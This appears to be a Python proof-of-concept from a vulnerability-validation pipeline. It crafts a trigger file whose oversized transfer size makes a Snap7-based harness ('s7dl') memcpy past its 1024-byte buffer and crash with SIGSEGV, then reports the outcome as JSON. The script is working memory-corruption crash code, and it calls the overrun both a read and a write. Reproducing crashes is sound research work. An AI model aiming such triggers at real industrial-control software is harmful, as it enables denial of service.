#!/usr/bin/env python3
"""PoC: trigger a SIGSEGV in the s7dl target binary.

The binary parses a trigger file:
  bytes 0..4 : little-endian int32  start offset
  bytes 4..8 : little-endian int32  transfer size
  bytes 8..  : caller data buffer

It prints "start=.. size=.. buff_len=.." and then performs a write via the
Snap7 client library (ct_write). Snap7 accepts transfer sizes up to 32768
bytes, but the harness passes the caller buffer without any length check, so
any size larger than the caller buffer makes the library memcpy far past the
end of the supplied buffer and the process dies with SIGSEGV.

This script builds the payload dynamically (start=0, size=8192, buffer=1024
patterned bytes), writes it to a temporary file, runs the binary once, and
emits the JSON output contract on stdout (and optionally to --json-out).
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time

# Transfer size chosen inside Snap7's accepted window (2049..32768) but far
# larger than the supplied caller buffer, forcing an out-of-bounds read.
TRANSFER_SIZE = 8192
START_OFFSET = 0
BUFFER_LEN = 1024


def build_payload() -> bytes:
    """Dynamically construct the trigger payload (header + data buffer)."""
    header = struct.pack("<ii", START_OFFSET, TRANSFER_SIZE)
    # Deterministic, non-trivial caller buffer (1024 bytes).
    buffer = bytes(range(256)) * (BUFFER_LEN // 256)
    return header + buffer


def signal_name(returncode: int):
    if returncode is not None and returncode < 0:
        try:
            return signal.Signals(-returncode).name
        except ValueError:
            return "SIG%d" % (-returncode)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="PoC trigger for s7dl crash")
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None, help="optional JSON output file")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="run timeout in seconds (default 30)")
    args = parser.parse_args()

    binary = args.binary
    trigger_path = None
    result = {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "crash_trace", "value": "", "path": None},
        "error": None,
    }

    try:
        if not os.path.isfile(binary):
            raise FileNotFoundError("binary not found: %s" % binary)
        if not os.access(binary, os.X_OK):
            raise PermissionError("binary is not executable: %s" % binary)

        # Build the payload dynamically and stage it in a temporary file.
        payload = build_payload()
        fd, trigger_path = tempfile.mkstemp(prefix="s7dl_trigger_", suffix=".bin")
        try:
            with os.fdopen(fd, "wb") as f:
                f.write(payload)

            argv = [binary, trigger_path]
            result["command"] = argv

            start_ts = time.monotonic()
            try:
                proc = subprocess.run(
                    argv,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=args.timeout,
                )
                elapsed_ms = int((time.monotonic() - start_ts) * 1000)
                stdout_text = proc.stdout.decode("utf-8", errors="replace")
                stderr_text = proc.stderr.decode("utf-8", errors="replace")

                result["returncode"] = proc.returncode
                result["signal"] = signal_name(proc.returncode)
                result["runtime_ms"] = elapsed_ms
                result["stdout"] = stdout_text
                result["stderr"] = stderr_text

                summary_line = stdout_text.strip().splitlines()[0] if stdout_text.strip() else ""
                if proc.returncode is not None and proc.returncode < 0:
                    sig = result["signal"] or ("signal %d" % (-proc.returncode))
                    result["observable"] = {
                        "kind": "crash_trace",
                        "value": (
                            "process terminated by %s (returncode=%d) after "
                            "printing %r; trigger start=%d size=%d buff_len=%d "
                            "drives an out-of-bounds write in ct_write"
                            % (sig, proc.returncode, summary_line,
                               START_OFFSET, TRANSFER_SIZE, BUFFER_LEN)
                        ),
                        "path": None,
                    }
                else:
                    result["observable"] = {
                        "kind": "combined_output",
                        "value": (
                            "process exited with returncode=%s; stdout=%r stderr=%r"
                            % (proc.returncode, stdout_text, stderr_text)
                        ),
                        "path": None,
                    }
            except subprocess.TimeoutExpired as exc:
                elapsed_ms = int((time.monotonic() - start_ts) * 1000)
                result["timed_out"] = True
                result["runtime_ms"] = elapsed_ms
                if exc.stdout:
                    result["stdout"] = exc.stdout.decode("utf-8", errors="replace") \
                        if isinstance(exc.stdout, bytes) else str(exc.stdout)
                if exc.stderr:
                    result["stderr"] = exc.stderr.decode("utf-8", errors="replace") \
                        if isinstance(exc.stderr, bytes) else str(exc.stderr)
                result["observable"] = {
                    "kind": "combined_output",
                    "value": "run exceeded timeout of %s seconds" % args.timeout,
                    "path": None,
                }
        finally:
            if trigger_path and os.path.exists(trigger_path):
                os.unlink(trigger_path)
    except Exception as exc:  # noqa: BLE001 - report any setup failure in JSON
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        result["observable"] = {
            "kind": "custom",
            "value": result["error"],
            "path": None,
        }

    output = json.dumps(result, indent=2)
    print(output)

    if args.json_out:
        try:
            with open(args.json_out, "w") as f:
                f.write(output + "\n")
        except OSError as exc:
            print("warning: could not write --json-out file: %s" % exc,
                  file=sys.stderr)

    return 0 if result["error"] is None else 1


if __name__ == "__main__":
    sys.exit(main())
